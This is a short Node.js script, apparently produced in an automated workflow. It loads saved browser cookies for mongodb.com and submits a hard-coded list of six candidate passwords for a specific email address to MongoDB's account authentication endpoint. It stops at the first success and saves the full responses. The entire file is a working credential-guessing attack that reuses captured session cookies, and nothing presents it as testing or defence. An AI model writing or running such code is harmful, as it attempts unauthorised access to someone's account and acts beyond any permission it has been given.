
const fs = require('fs');

function writeResult(obj){ fs.writeFileSync('workflow_result.json', JSON.stringify(obj, null, 2)); }

function buildAccountCookieHeader() {
  try {
    const raw = JSON.parse(fs.readFileSync('browser_cookies.json','utf8'));
    const cookies = Array.isArray(raw.cookies) ? raw.cookies : [];
    const parts = [];
    for (const c of cookies) {
      const d = String(c.domain || '');
      const v = typeof c.value === 'string' ? c.value : '';
      if (!v) continue;
      if (d === 'account.mongodb.com' || d === '.account.mongodb.com' || d === '.mongodb.com') {
        parts.push(`${c.name}=${c.value}`);
      }
    }
    return parts.join('; ');
  } catch { return ''; }
}

async function tryPassword(password, cookieHeader) {
  const headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0',
  };
  if (cookieHeader) headers['Cookie'] = cookieHeader;
  const resp = await fetch('https://account.mongodb.com/account/auth/verify', {
    method: 'POST',
    headers,
    body: JSON.stringify({ username: 'oaimcpatlas@gmail.com', password }),
    redirect: 'manual',
  });
  const text = await resp.text();
  let json = null;
  try { json = JSON.parse(text); } catch {}
  return {
    password,
    status: resp.status,
    headers: Object.fromEntries(resp.headers.entries()),
    body: text,
    json
  };
}

async function main() {
  const result = { cookieHeaderLength: 0, triedAt: new Date().toISOString() };
  try {
    const cookieHeader = buildAccountCookieHeader();
    result.cookieHeaderLength = cookieHeader.length;
    const candidates = [
      'AtlasGHReset!6789',
      'VJ2!V6Q!Tm)k(K)Ls9An*t8uN9',
      'AtlasKnown!12345',
      'Scratch!321Aa',
      'GHQuery!83fddfa4Z9#',
      'Tmp!2e7ad4aa5c4fe3d1aA1',
    ];
    result.candidates = [];
    for (const pw of candidates) {
      const res = await tryPassword(pw, cookieHeader);
      result.candidates.push(res);
      if (res.status === 200 && res.json && res.json.status === 'OK') {
        result.success = res;
        break;
      }
    }
  } catch (e) {
    result.error = String(e && e.stack || e);
  } finally {
    writeResult(result);
  }
}
main();
